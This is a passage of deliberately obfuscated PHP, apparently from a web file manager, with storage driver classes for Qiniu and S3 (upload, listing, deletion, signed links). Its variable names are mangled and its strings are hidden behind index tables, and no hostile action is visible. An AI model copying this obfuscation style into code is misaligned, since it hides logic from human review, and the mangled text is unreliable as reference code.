$Á°îÑùµ[$Ã½§Ó‡„[1168]]; $ÛâÔÑŸ = $Á°îÑùµ[$Ã½§Ó‡„[399]]; switch ($Á°îÑùµ[$Ã½§Ó‡„[33]]) { case KodIO::KOD_IO: $ÎÙ¼¶äØ = self::$driverListSystem[$ÛâÔÑŸ]; break; case KodIO::KOD_SOURCE: $¤ë‹ƒ® = $ÛâÔÑŸ . $¤ë‹ƒ®; $ÎÙ¼¶äØ = array($Ã½§Ó‡„[1169] => $Ã½§Ó‡„[1170], $Ã½§Ó‡„[6] => $Á°îÑùµ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¹—‚Æ¦ = $GLOBALS[$Ã½§Ó‡„[1171]]; self::$driverListUser = array_to_keyvalue($¹—‚Æ¦, $Ã½§Ó‡„[399]); } $ÎÙ¼¶äØ = self::$driverListUser[$ÛâÔÑŸ]; break; case KodIO::KOD_SHARE_LINK: $ÎÙ¼¶äØ = array($Ã½§Ó‡„[1169] => $Ã½§Ó‡„[1172], $Ã½§Ó‡„[6] => $Á°îÑùµ); $¢ôª§Í = Action($Ã½§Ó‡„[1173])->sharePathInfo($Á°îÑùµ[$Ã½§Ó‡„[84]]); $¤ë‹ƒ® = $¢ôª§Í[$Ã½§Ó‡„[402]]; if (!$¢ôª§Í[$Ã½§Ó‡„[402]]) { $êÂ¸ø‘ˆ = Model($Ã½§Ó‡„[601])->getInfo($¢ôª§Í[$Ã½§Ó‡„[489]]); $¤ë‹ƒ® = KodIO::clear($êÂ¸ø‘ˆ[$Ã½§Ó‡„[1174]] . $Á°îÑùµ[$Ã½§Ó‡„[1167]]); $Á°îÑùµ[$Ã½§Ó‡„[487]] = $êÂ¸ø‘ˆ; $Á°îÑùµ[$Ã½§Ó‡„[1149]] = $¤ë‹ƒ®; $ÎÙ¼¶äØ = array($Ã½§Ó‡„[1169] => $Ã½§Ó‡„[1175], $Ã½§Ó‡„[6] => $Á°îÑùµ); } break; case KodIO::KOD_SHARE_ITEM: $ÎÙ¼¶äØ = array($Ã½§Ó‡„[1169] => $Ã½§Ó‡„[1176], $Ã½§Ó‡„[6] => $Á°îÑùµ); $êÂ¸ø‘ˆ = Model($Ã½§Ó‡„[601])->getInfo($Á°îÑùµ[$Ã½§Ó‡„[399]]); if ($êÂ¸ø‘ˆ[$Ã½§Ó‡„[402]] == $Ã½§Ó‡„[197]) { $¤ë‹ƒ® = KodIO::clear($êÂ¸ø‘ˆ[$Ã½§Ó‡„[1174]] . $Á°îÑùµ[$Ã½§Ó‡„[1167]]); $Á°îÑùµ[$Ã½§Ó‡„[487]] = $êÂ¸ø‘ˆ; $Á°îÑùµ[$Ã½§Ó‡„[1149]] = $¤ë‹ƒ®; $ÎÙ¼¶äØ = array($Ã½§Ó‡„[1169] => $Ã½§Ó‡„[1177], $Ã½§Ó‡„[6] => $Á°îÑùµ); } else { if (!$¤ë‹ƒ®) { $¤ë‹ƒ® = $êÂ¸ø‘ˆ[$Ã½§Ó‡„[402]]; } } break; default: $¤ë‹ƒ® = $Á°îÑùµ[$Ã½§Ó‡„[84]]; $ÎÙ¼¶äØ = array($Ã½§Ó‡„[1169] => $Ã½§Ó‡„[1178]); break; } $ ±§õôä = $Á°îÑùµ[$Ã½§Ó‡„[84]]; if (!isset(self::$driverCache[$ ±§õôä])) { $«ÉÛ¥€Ş = strtolower($ÎÙ¼¶äØ[$Ã½§Ó‡„[95]]); $ïæ¤¬×“ = $GLOBALS[$Ã½§Ó‡„[6]][$Ã½§Ó‡„[89]][$Ã½§Ó‡„[817]]; $‹‚ñÉ = $Ã½§Ó‡„[74] . (isset($ïæ¤¬×“[$«ÉÛ¥€Ş]) ? $ïæ¤¬×“[$«ÉÛ¥€Ş] : ucfirst($«ÉÛ¥€Ş)); if (!class_exists($‹‚ñÉ)) { show_json("{$‹‚ñÉ}\x20\x6e\x6f\x74\40\145\x78\151\x73\164\163\x21", !1); } $Äº…ĞƒÓ = isset($ÎÙ¼¶äØ[$Ã½§Ó‡„[6]]) ? $ÎÙ¼¶äØ[$Ã½§Ó‡„[6]] : !1; self::$driverCache[$ ±§õôä] = new $‹‚ñÉ($Äº…ĞƒÓ); } $˜®¼ ´æ = self::$driverCache[$ ±§õôä]; $˜®¼ ´æ->pathDriver = $‹íñ£; $˜®¼ ´æ->pathBase = $Ã½§Ó‡„[12]; if (isset($ÎÙ¼¶äØ[$Ã½§Ó‡„[6]][$Ã½§Ó‡„[1179]])) { $˜®¼ ´æ->pathBase = rtrim($ÎÙ¼¶äØ[$Ã½§Ó‡„[6]][$Ã½§Ó‡„[1179]], $Ã½§Ó‡„[8]) . $Ã½§Ó‡„[8]; $¤ë‹ƒ® = $˜®¼ ´æ->pathBase . ltrim($¤ë‹ƒ®, $Ã½§Ó‡„[8]); } $¤ë‹ƒ® = $˜®¼ ´æ->getPath($¤ë‹ƒ®); if (isset($Á°îÑùµ[$Ã½§Ó‡„[1149]])) { $¤ë‹ƒ® = $Á°îÑùµ[$Ã½§Ó‡„[1149]]; } $˜®¼ ´æ->path = $¤ë‹ƒ®; return $˜®¼ ´æ; } public static function errorTips($ëµØŸÎ = false) { $³Ã²Ûš³ =& $_SERVER[­õöî’–]; static $—ÓÈ´Ğş = array(); $ÅÊà÷Õ  = 1000; if ($ëµØŸÎ === -1) { return $—ÓÈ´Ğş ? $—ÓÈ´Ğş[count($—ÓÈ´Ğş) - 1] : $³Ã²Ûš³[12]; } if ($ëµØŸÎ === !1) { return implode($³Ã²Ûš³[231], $—ÓÈ´Ğş); } if (count($—ÓÈ´Ğş) >= $ÅÊà÷Õ ) { $—ÓÈ´Ğş = array_slice($—ÓÈ´Ğş, $ÅÊà÷Õ  * 0.5, $ÅÊà÷Õ ); } $—ÓÈ´Ğş[] = $ëµØŸÎ; write_log($³Ã²Ûš³[162] . ACTION . $³Ã²Ûš³[1180] . $ëµØŸÎ, $³Ã²Ûš³[1181]); } public static function getLastError($ÎÚòˆÅÆ = '') { $ö¼§é¶ = self::errorTips(-1); return $ö¼§é¶ ? $ö¼§é¶ : $ÎÚòˆÅÆ; } } goto aˆ¡ÙÂ­¿—; c·ŠÙòŒÌ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($âŒÁ€Ôè) { parent::__construct(); require_once SDK_DIR . $_SERVER[­õöî’–][1432]; $this->_init($âŒÁ€Ôè); } public function _init($ù¬­†¡œ) { $…Éù‰æÏ =& $_SERVER[­õöî’–]; foreach ($ù¬­†¡œ as $¥†ÎèÖé => $Üã¿‚×) { if (isset($this->{$¥†ÎèÖé})) { $this->{$¥†ÎèÖé} = $Üã¿‚×; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($…Éù‰æÏ[1433] . LNG($…Éù‰æÏ[1391])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($õ§öÚïœ, $ññ× Â = '', $É´µ¡Œ = REPEAT_RENAME) { if ($this->setContent($õ§öÚïœ, $ññ× Â)) { return $this->getPathOuter($õ§öÚïœ); } return !1; } public function mkdir($ú‹„—å, $±‘ú…è¼ = REPEAT_SKIP) { $Í²Ô‡÷ˆ =& $_SERVER[­õöî’–]; $ä«İ µ = trim($ú‹„—å, $Í²Ô‡÷ˆ[8]); if ($this->_isFolder($ä«İ µ)) { return $this->getPathOuter($ä«İ µ); } $ú‹„—å = $ä«İ µ . $Í²Ô‡÷ˆ[8]; $•¼Î¶Î = get_path_this($ä«İ µ); $†»ÔÌÅ = $ú‹„—å . $•¼Î¶Î; if (!$this->mkfile($†»ÔÌÅ)) { return !1; } if (!$this->moveFile($†»ÔÌÅ, $ú‹„—å)) { $this->delFile($†»ÔÌÅ); return !1; } return $this->getPathOuter($ä«İ µ); } public function copyFile($ëÍ¨Ûª, $û¢Œ°ğŠ) { $³ûø”ê = $this->bucketManager->copy($this->bucket, $ëÍ¨Ûª, $this->bucket, $û¢Œ°ğŠ, !0); return $³ûø”ê ? !1 : $this->getPathOuter($û¢Œ°ğŠ); } public function moveFile($çÔƒÆÇ, $Äñ¦÷¯ê) { $îéãî’ = $this->bucketManager->move($this->bucket, $çÔƒÆÇ, $this->bucket, $Äñ¦÷¯ê, !0); return $îéãî’ ? !1 : $this->getPathOuter($Äñ¦÷¯ê); } public function delFile($Òôâ›¨Ç) { if (!$this->exist($Òôâ›¨Ç)) { return !0; } $á¯çşÔø = $this->bucketManager->delete($this->bucket, $Òôâ›¨Ç); return $á¯çşÔø ? !1 : !0; } public function delFolder($€•š©€) { $ëîâíş› =& $_SERVER[­õöî’–]; if (!$this->exist($€•š©€)) { return !0; } $this->listItemCache = !1; $¥öÉÊÅ = $this->fileList($€•š©€); $this->listItemCache = !0; $¾ÕôÃè = trim($€•š©€, $ëîâíş›[8]) . $ëîâíş›[8]; if (!empty($€•š©€) && $€•š©€ !== $ëîâíş›[197] && !in_array($¾ÕôÃè, $¥öÉÊÅ[$ëîâíş›[82]])) { $¥öÉÊÅ[$ëîâíş›[82]][] = $¾ÕôÃè; } $ç—Êè³Ï = $this->delByBatch($¥öÉÊÅ[$ëîâíş›[83]]); if (!$ç—Êè³Ï) { return !1; } $ç—Êè³Ï = $this->delByBatch($¥öÉÊÅ[$ëîâíş›[82]]); if (!$ç—Êè³Ï) { return !1; } return $this->delFile($¾ÕôÃè); } private function delByBatch($èé•¡) { foreach (array_chunk($èé•¡, 1000) as $µÀñµ¸‚) { $©—äÀåœ = $this->bucketManager->buildBatchDelete($this->bucket, $µÀñµ¸‚); list($÷…ç™Î¾, $ı®øˆ¦Æ) = $this->bucketManager->batch($©—äÀåœ); if ($ı®øˆ¦Æ) { return !1; } } return !0; } public function rename($ğ’›õŞ, $ÅÕïîƒ) { return $this->renameObject($ğ’›õŞ, $ÅÕïîƒ); } public function fileInfo($—£ÏşîË, $µĞ©ıÅü = false, $§ÃÁ½Ú = array()) { $èÔ­•¨ç =& $_SERVER[­õöî’–]; $Ö…Šª—ª = array($èÔ­•¨ç[32] => $this->pathThis($—£ÏşîË), $èÔ­•¨ç[84] => $this->getPathOuter($èÔ­•¨ç[8] . $—£ÏşîË), $èÔ­•¨ç[33] => $èÔ­•¨ç[199], $èÔ­•¨ç[76] => isset($§ÃÁ½Ú[$èÔ­•¨ç[1434]]) ? $§ÃÁ½Ú[$èÔ­•¨ç[1434]] : 0, $èÔ­•¨ç[174] => $this->ext($—£ÏşîË)); if ($µĞ©ıÅü) { return $Ö…Šª—ª; } $Ö…Šª—ª[$èÔ­•¨ç[200]] = $Ö…Šª—ª[$èÔ­•¨ç[85]] = 0; $Ö…Šª—ª[$èÔ­•¨ç[201]] = $Ö…Šª—ª[$èÔ­•¨ç[202]] = !0; if (empty($§ÃÁ½Ú)) { $§ÃÁ½Ú = $this->objectMeta($—£ÏşîË); if (!$§ÃÁ½Ú) { return $Ö…Šª—ª; } } if (isset($§ÃÁ½Ú[$èÔ­•¨ç[1435]])) { $Ö…Šª—ª[$èÔ­•¨ç[85]] = substr($§ÃÁ½Ú[$èÔ­•¨ç[1435]] . $èÔ­•¨ç[12], 0, 10); } if (isset($§ÃÁ½Ú[$èÔ­•¨ç[1434]])) { $Ö…Šª—ª[$èÔ­•¨ç[76]] = $§ÃÁ½Ú[$èÔ­•¨ç[1434]]; } return $Ö…Šª—ª; } public function folderInfo($Îû¬Ğíæ, $ÌË«‡‹ = false) { $éÒÑØ­Ó =& $_SERVER[­õöî’–]; $â÷¯š¾à = array($éÒÑØ­Ó[32] => $this->pathThis($Îû¬Ğíæ), $éÒÑØ­Ó[84] => $this->getPathOuter($éÒÑØ­Ó[8] . $Îû¬Ğíæ), $éÒÑØ­Ó[33] => $éÒÑØ­Ó[75]); if ($ÌË«‡‹) { return $â÷¯š¾à; } $â÷¯š¾à[$éÒÑØ­Ó[200]] = $â÷¯š¾à[$éÒÑØ­Ó[85]] = 0; $â÷¯š¾à[$éÒÑØ­Ó[201]] = $â÷¯š¾à[$éÒÑØ­Ó[202]] = !0; $Îû¬Ğíæ = rtrim($Îû¬Ğíæ, $éÒÑØ­Ó[8]) . $éÒÑØ­Ó[8]; $«Õú€Û© = $this->objectMeta($Îû¬Ğíæ); if (isset($«Õú€Û©[$éÒÑØ­Ó[1435]])) { $â÷¯š¾à[$éÒÑØ­Ó[85]] = substr($«Õú€Û©[$éÒÑØ­Ó[1435]] . $éÒÑØ­Ó[12], 0, 10); } return $â÷¯š¾à; } public function listPath($ÎÒ³Ç „, $ô´ƒµøÛ = false) { $˜èã¾±û =& $_SERVER[­õöî’–]; $¨ìÒŠ°î = $this->fileList($ÎÒ³Ç „, $˜èã¾±û[8], !0); foreach ($¨ìÒŠ°î[$˜èã¾±û[82]] as $ê·««İ => $ê›ú¯•¶) { $¨ìÒŠ°î[$˜èã¾±û[82]][$ê·««İ] = $this->folderInfo($ê›ú¯•¶, $ô´ƒµøÛ); } foreach ($¨ìÒŠ°î[$˜èã¾±û[83]] as $ê·««İ => $ê›ú¯•¶) { $¨ìÒŠ°î[$˜èã¾±û[83]][$ê·««İ] = $this->fileInfo($ê›ú¯•¶[$˜èã¾±û[94]], $ô´ƒµøÛ, $ê›ú¯•¶); } return $¨ìÒŠ°î; } public function has($Ù¸ ‡ô¥, $·ˆüÏÅ = false, $ÍŸğĞŞ’ = true) { $¸ºÜ‚ ñ =& $_SERVER[­õöî’–]; $Ù¸ ‡ô¥ = trim($Ù¸ ‡ô¥, $¸ºÜ‚ ñ[8]); $ÑÃ¹¨Œ¨ = empty($Ù¸ ‡ô¥) && $Ù¸ ‡ô¥ !== $¸ºÜ‚ ñ[197] ? $¸ºÜ‚ ñ[12] : $Ù¸ ‡ô¥ . $¸ºÜ‚ ñ[8]; $¿×Û˜¦œ = $¸ºÜ‚ ñ[12]; $ª¿å¸€ = 500; $†¬Å¦Â = $¸ºÜ‚ ñ[8]; $æ¡Ö¥©í = $†º†ë­ = 0; while (!0) { check_abort(); list($®³Ç‘“, $Ü§Ğ«„Õ) = $this->bucketManager->listFiles($this->bucket, $ÑÃ¹¨Œ¨, $¿×Û˜¦œ, $ª¿å¸€, $†¬Å¦Â); if ($Ü§Ğ«„Õ) { break; } $¿×Û˜¦œ = array_key_exists($¸ºÜ‚ ñ[1403], $®³Ç‘“) ? $¿×Û˜¦œ = $®³Ç‘“[$¸ºÜ‚ ñ[1436]] : $¸ºÜ‚ ñ[12]; if ($·ˆüÏÅ) { if (!empty($®³Ç‘“[$¸ºÜ‚ ñ[1437]])) { $æ¡Ö¥©í += count($®³Ç‘“[$¸ºÜ‚ ñ[1437]]); } if (!empty($®³Ç‘“[$¸ºÜ‚ ñ[1438]])) { $†º†ë­ += count($®³Ç‘“[$¸ºÜ‚ ñ[1438]]); } if ($¿×Û˜¦œ === $¸ºÜ‚ ñ[12]) { break; } continue; } if ($ÍŸğĞŞ’) { if (!empty($®³Ç‘“[$¸ºÜ‚ ñ[1437]])) { return !0; } } else { if (!empty($®³Ç‘“[$¸ºÜ‚ ñ[1438]])) { return !0; } } if ($¿×Û˜¦œ === $¸ºÜ‚ ñ[12]) { break; } } if ($·ˆüÏÅ) { return array($¸ºÜ‚ ñ[207] => $æ¡Ö¥©í, $¸ºÜ‚ ñ[208] => $†º†ë­); } return !1; } public function listAll($ù©ºöÉï) { $ı×ìú„õ =& $_SERVER[­õöî’–]; $¹¹Õ¯üÎ = $this->fileList($ù©ºöÉï, $ı×ìú„õ[12], !0); $«úò«‹© = array(); foreach ($¹¹Õ¯üÎ[$ı×ìú„õ[83]] as $ˆÆˆğŒ) { $«úò«‹©[$ˆÆˆğŒ[$ı×ìú„õ[94]]] = $ˆÆˆğŒ[$ı×ìú„õ[76]]; } foreach ($¹¹Õ¯üÎ[$ı×ìú„õ[82]] as $ˆÆˆğŒ) { if (is_string($ˆÆˆğŒ)) { $«úò«‹©[$ˆÆˆğŒ] = 0; } } return $this->listAllFiles($ù©ºöÉï, array_keys($«úò«‹©), $«úò«‹©); } private function fileList($üş§üÈ—, $Š­À¤” = '', $–ìÄÑ ğ = 0) { $ÑÌâİÇ¹ =& $_SERVER[­õöî’–]; $üş§üÈ— = trim($üş§üÈ—, $ÑÌâİÇ¹[8]); $—–¯°ÓÔ = empty($üş§üÈ—) && $üş§üÈ— !== $ÑÌâİÇ¹[197] ? $ÑÌâİÇ¹[12] : $üş§üÈ— . $ÑÌâİÇ¹[8]; $ÈúŠ˜°› = $ÑÌâİÇ¹[12]; $½¹¨ÃŒœ = 1000; $¿ Ê¬²‹ = $òø´€Íé = array(); while (!0) { check_abort(); list($¬Ñğ¤ù, $ÓÕ§éÊ) = $this->bucketManager->listFiles($this->bucket, $—–¯°ÓÔ, $ÈúŠ˜°›, $½¹¨ÃŒœ, $Š­À¤”); if ($ÓÕ§éÊ) { break; } $ÈúŠ˜°› = array_key_exists($ÑÌâİÇ¹[1403], $¬Ñğ¤ù) ? $ÈúŠ˜°› = $¬Ñğ¤ù[$ÑÌâİÇ¹[1436]] : $ÑÌâİÇ¹[12]; $È Ê— = isset($¬Ñğ¤ù[$ÑÌâİÇ¹[1437]]) ? $¬Ñğ¤ù[$ÑÌâİÇ¹[1437]] : array(); $°½ ‘±ª = isset($¬Ñğ¤ù[$ÑÌâİÇ¹[1438]]) ? $¬Ñğ¤ù[$ÑÌâİÇ¹[1438]] : array(); foreach ($È Ê— as $î¤®“Ş) { if ($î¤®“Ş[$ÑÌâİÇ¹[94]] == $—–¯°ÓÔ) { continue; } $æÎÄÙÆŠ = $î¤®“Ş[$ÑÌâİÇ¹[94]]; $©È­­†‚ = $î¤®“Ş[$ÑÌâİÇ¹[1434]]; $î¤®“Ş[$ÑÌâİÇ¹[76]] = $©È­­†‚; $¨‡Ê¡ = $©È­­†‚ == 0 && substr($æÎÄÙÆŠ, strlen($æÎÄÙÆŠ) - 1, 1) == $ÑÌâİÇ¹[8] ? !0 : !1; $this->cacheMethodInfoSet($æÎÄÙÆŠ, $¨‡Ê¡, $î¤®“Ş); if ($¨‡Ê¡) { $¿ Ê¬²‹[] = $æÎÄÙÆŠ; continue; } $òø´€Íé[] = $–ìÄÑ ğ ? $î¤®“Ş : $æÎÄÙÆŠ; } foreach ($°½ ‘±ª as $æÎÄÙÆŠ) { if ($æÎÄÙÆŠ == $—–¯°ÓÔ) { continue; } $¿ Ê¬²‹[] = $æÎÄÙÆŠ; $this->cacheMethodInfoSet($æÎÄÙÆŠ, !0); } if ($ÈúŠ˜°› === $ÑÌâİÇ¹[12]) { break; } } $this->cacheMethodInfoSet($üş§üÈ—, !0); return array($ÑÌâİÇ¹[82] => $¿ Ê¬²‹, $ÑÌâİÇ¹[83] => $òø´€Íé); } public function canRead($®´šåİÜ) { return $this->exist($®´šåİÜ) ? !0 : !1; } public function canWrite($´²¼ıÎ) { return $this->exist($´²¼ıÎ) ? !0 : !1; } public function getContent($ĞùèíõÙ) { return $this->fileSubstr($ĞùèíõÙ, 0, -1); } public function setContent($ ¡´¶ß, $ìñ‹Á¥ = '') { $Ç¾¨“˜ = $this->tempFile($this->pathThis($ ¡´¶ß)); file_put_contents($Ç¾¨“˜, $ìñ‹Á¥); if ($this->upload($ ¡´¶ß, $Ç¾¨“˜)) { $this->tempFileRemve($Ç¾¨“˜); return !0; } return !1; } public function refreshUrls($ÃÂ°å¿) { $¨— ½˜Ó =& $_SERVER[­õöî’–]; $Ù÷ùÀ»· = array(); if (is_array($ÃÂ°å¿)) { foreach ($ÃÂ°å¿ as $»®µøÕŠ) { $Ù÷ùÀ»·[] = $this->link($»®µøÕŠ); } } else { $Ù÷ùÀ»·[] = $this->link($ÃÂ°å¿); } $‚¼–Ö¬• = new Qiniu\Cdn\CdnManager($this->auth); list($¨Ã©øšÇ, $î†İ•×¬) = $‚¼–Ö¬•->refreshUrls($Ù÷ùÀ»·); if ($î†İ•×¬) { return !1; } return $¨Ã©øšÇ[$¨— ½˜Ó[1181]] == $¨— ½˜Ó[751] ? !0 : !1; } public function fileSubstr($‚‰Ôê, $‘øĞÎú, $Ì—æåßû) { $¥˜Š“à =& $_SERVER[­õöî’–]; if (!($¡Óƒ˜ÕÔ = $this->link($‚‰Ôê))) { return !1; } $Ø¬…¨õÉ = !1; if ($Ì—æåßû > 0) { $üù¾‹ö = $‘øĞÎú + $Ì—æåßû - 1; $Ø¬…¨õÉ = array($¥˜Š“à[1439] . $‘øĞÎú . $¥˜Š“à[386] . $üù¾‹ö); } $‹ìİˆÔí = url_request($¡Óƒ˜ÕÔ, $¥˜Š“à[230], !1, $Ø¬…¨õÉ); return $‹ìİˆÔí[$¥˜Š“à[741]] ? $‹ìİˆÔí[$¥˜Š“à[1201]] : !1; } public function upload($¼Ê¤É«Í, $‘ç©×Œ², $™ğÒáı‰ = false, $©ÆıµÒ¼ = REPEAT_REPLACE) { $ˆ âöº“ = new Qiniu\Storage\UploadManager(); $Ş‹Ş–Ó = $this->auth->uploadToken($this->bucket, $¼Ê¤É«Í); $Òš¤øÎ£ = get_file_mime(get_path_ext($‘ç©×Œ²)); list($±‰“Šœ, $¸±Ø¤¤¹) = $ˆ âöº“->putFile($Ş‹Ş–Ó, $¼Ê¤É«Í, $‘ç©×Œ², null, $Òš¤øÎ£); return $¸±Ø¤¤¹ ? !1 : $this->getPathOuter($¼Ê¤É«Í); } public function uploadFormData($´åœ¿êÛ, $×Ü¯¶æ‹ = 3600) { return $this->uploadToken($´åœ¿êÛ, $×Ü¯¶æ‹); } public function multiUploadFormData($Ø»áµ´¢, $—€‰Ï©« = 3600) { return $this->uploadToken($Ø»áµ´¢, $—€‰Ï©«); } private function uploadToken($ı¦Êş×‰, $üïôôÇ = 3600) { $ŸÎ–şÔ† =& $_SERVER[­õöî’–]; $¨¬ÙÚˆş = $üïôôÇ; $·©óŒœ  = array($ŸÎ–şÔ†[1440] => $ŸÎ–şÔ†[1441]); $ÛÔñÊ³İ = $ı¦Êş×‰; $üËë–€­ = $this->auth->uploadToken($this->bucket, $ÛÔñÊ³İ, $¨¬ÙÚˆş, $·©óŒœ , !0); $¡ç‚Ë = empty($this->region) || $this->region == $ŸÎ–şÔ†[1442] ? $ŸÎ–şÔ†[12] : $ŸÎ–şÔ†[386] . $this->region; $İÈ¨…ŠÒ = http_type() . "\x3a\x2f\x2f\165\x70\x6c\157\x61\144{$¡ç‚Ë}\x2e\x71\151\156\x69\165\x70\x2e\143\x6f\155\x2f"; return array($ŸÎ–şÔ†[1443] => $üËë–€­, $ŸÎ–şÔ†[1444] => $İÈ¨…ŠÒ); } public function download($¸­›À¹Ç, $È‘‰í”ø) { $‡š¥ÀÌÉ = IO::getPathInner(IO::mkfile($È‘‰í”ø)); if (!($íÏş¥¨â = $this->link($¸­›À¹Ç))) { return !1; } $º¢¹ûô› = 0; $åöŒõñú = 1024 * 200; $²–ùÛ = fopen($‡š¥ÀÌÉ, $_SERVER[­õöî’–][1445]); while (!0) { $¿ªšöœ = $this->fileSubstr($¸­›À¹Ç, $º¢¹ûô›, $åöŒõñú); if ($¿ªšöœ === !1) { return !1; } fwrite($²–ùÛ, $¿ªšöœ); $º¢¹ûô› += $åöŒõñú; if (strlen($¿ªšöœ) < $åöŒõñú) { break; } } fclose($²–ùÛ); return $È‘‰í”ø; } public function link($¢´ôëÖ£, $´Äë­€ = '') { if (!$this->isFile($¢´ôëÖ£)) { return !1; } $µ¸íì§× = $this->getHost() . $_SERVER[­õöî’–][8] . $this->pathEncode($¢´ôëÖ£) . $´Äë­€; return $this->auth->privateDownloadUrl($µ¸íì§×, 3600 * 12); } public function fileOut($µå·’ğß, $”öåã‘Ê = false, $şÃ£„µ¯ = false, $â›ø»ŞÇ = '') { $¥ş‹ä°ä =& $_SERVER[­õöî’–]; if ($this->isFileOutServer()) { return $this->fileOutServer($µå·’ğß, $”öåã‘Ê, $şÃ£„µ¯, $â›ø»ŞÇ); } if (!$şÃ£„µ¯) { $şÃ£„µ¯ = $this->pathThis($µå·’ğß); } $ˆù§³‘ = $”öåã‘Ê ? $¥ş‹ä°ä[1446] . rawurlencode($şÃ£„µ¯) : $¥ş‹ä°ä[12]; $¶‚ïŠ” = $this->link($µå·’ğß, $ˆù§³‘); $this->fileOutLink($¶‚ïŠ”); } public function fileOutServer($ÃĞ½ÚÂ·, $§Úãç‰ª = false, $ÕÉÑ¡ãê = false, $´‘Øô¡ù = '') { parent::fileOut($ÃĞ½ÚÂ·, $§Úãç‰ª, $ÕÉÑ¡ãê, $´‘Øô¡ù); } public function fileOutImage($Ş»Ñáîà, $øÎôÛ¨ = 250) { $ÀÒ¯äËÁ = $this->link($Ş»Ñáîà, $_SERVER[­õöî’–][1447] . $øÎôÛ¨); $this->fileOutLink($ÀÒ¯äËÁ); } public function fileOutImageServer($±‰îÉ³è, $âü€£æ­ = 250) { parent::fileOutImage($±‰îÉ³è, $âü€£æ­); } public function hashMd5($Ì„ÓÈ˜ù) { $ÔçöÆ–ì =& $_SERVER[­õöî’–]; $È¾ü«Áè = $this->objectMeta($Ì„ÓÈ˜ù); return isset($È¾ü«Áè[$ÔçöÆ–ì[212]]) ? $È¾ü«Áè[$ÔçöÆ–ì[212]] : !1; $†œ˜ÏúÎ = $this->link($Ì„ÓÈ˜ù, $ÔçöÆ–ì[1448]); } public function size($ñõ÷ïÑ°) { $àÃ»ªÄİ = $this->objectMeta($ñõ÷ïÑ°); return $àÃ»ªÄİ ? $àÃ»ªÄİ[$_SERVER[­õöî’–][76]] : 0; } public function info($²¢½¿ü›) { if ($this->isFolder($²¢½¿ü›)) { return $this->folderInfo($²¢½¿ü›); } else { if ($this->isFile($²¢½¿ü›)) { return $this->fileInfo($²¢½¿ü›); } } return !1; } public function exist($†©øÌù·) { return $this->isFile($†©øÌù·) || $this->isFolder($†©øÌù·); } public function isFile($í¦‚¾ûâ) { return !$this->isFolder($í¦‚¾ûâ) && $this->objectMeta($í¦‚¾ûâ); } public function isFolder($¿Æ¯í) { return $this->cacheMethod($_SERVER[­õöî’–][165], $¿Æ¯í); } protected function objectMeta($¼¶çÖ†ö) { return $this->cacheMethod($_SERVER[­õöî’–][167], $¼¶çÖ†ö); } protected function _objectMeta($Ù­Åèêå) { $ï•ò¢ûÂ =& $_SERVER[­õöî’–]; list($â»Ô†¬¤, $Ú«¿Çİ) = $this->bucketManager->stat($this->bucket, $Ù­Åèêå); if ($â»Ô†¬¤) { $â»Ô†¬¤[$ï•ò¢ûÂ[76]] = intval($â»Ô†¬¤[$ï•ò¢ûÂ[1434]]); } return $â»Ô†¬¤; } protected function _isFolder($ûôß¢ú) { $ÌÃÉ³öÌ =& $_SERVER[­õöî’–]; if ($ûôß¢ú == $ÌÃÉ³öÌ[12] || $ûôß¢ú == $ÌÃÉ³öÌ[8]) { return !0; } list($®”¯Ã•Ì, $ÂÆ¯ÅÉ) = $this->bucketManager->listFiles($this->bucket, trim($ûôß¢ú, $ÌÃÉ³öÌ[8]) . $ÌÃÉ³öÌ[8], $ÌÃÉ³öÌ[12], 1, $ÌÃÉ³öÌ[8]); return !empty($®”¯Ã•Ì[$ÌÃÉ³öÌ[1437]]) || !empty($®”¯Ã•Ì[$ÌÃÉ³öÌ[1438]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¯™§¸Ø) { parent::__construct($¯™§¸Ø); } public function uploadFormData($õ“™¬á, $ßµüÇÑ™ = 3600) { $¨ï’Ö—ä =& $_SERVER[­õöî’–]; $ŠôêÍ³Ñ = $¨ï’Ö—ä[198]; $ìë¡¦Ÿ = $¨ï’Ö—ä[1353]; $ìÔ¨§ó‹ = $¨ï’Ö—ä[62]; $© ˜‚Ù® = gmdate($¨ï’Ö—ä[1354]); $¨Ï“Õú = gmdate($¨ï’Ö—ä[742]); $¬ß˜¬æ = $¨ï’Ö—ä[1355]; $”ì­ƒí = $ßµüÇÑ™ . $¨ï’Ö—ä[12]; $İıçêÒŒ = $¨ï’Ö—ä[1317]; $²´ÜãË = array($this->accessKey, $¨Ï“Õú, $this->region, $ìÔ¨§ó‹, $¬ß˜¬æ); $ËÏÜ ×© = implode($¨ï’Ö—ä[8], $²´ÜãË); $Ä˜ÊµÍ = array($¨ï’Ö—ä[1319] => gmdate($¨ï’Ö—ä[1318], strtotime($¨ï’Ö—ä[1356])), $¨ï’Ö—ä[1320] => array(array($¨ï’Ö—ä[1322] => $this->bucket), array($¨ï’Ö—ä[1321] => $ŠôêÍ³Ñ), array($¨ï’Ö—ä[1323], $¨ï’Ö—ä[1324], $¨ï’Ö—ä[12]), array($¨ï’Ö—ä[1323], $¨ï’Ö—ä[1357], $¨ï’Ö—ä[12]), array($¨ï’Ö—ä[1323], $¨ï’Ö—ä[1358], $¨ï’Ö—ä[12]), array($¨ï’Ö—ä[1325] => $İıçêÒŒ), array($¨ï’Ö—ä[1359] => $ËÏÜ ×©), array($¨ï’Ö—ä[1360] => $ìë¡¦Ÿ), array($¨ï’Ö—ä[1361] => $© ˜‚Ù®), array($¨ï’Ö—ä[1362] => $”ì­ƒí))); $†İ§ƒ¬ = base64_encode(json_encode($Ä˜ÊµÍ)); $¨ªëöÄ = hash_hmac($¨ï’Ö—ä[1363], $¨Ï“Õú, $¨ï’Ö—ä[1364] . $this->secret, !0); $”˜ì©ÆÉ = hash_hmac($¨ï’Ö—ä[1363], $this->region, $¨ªëöÄ, !0); 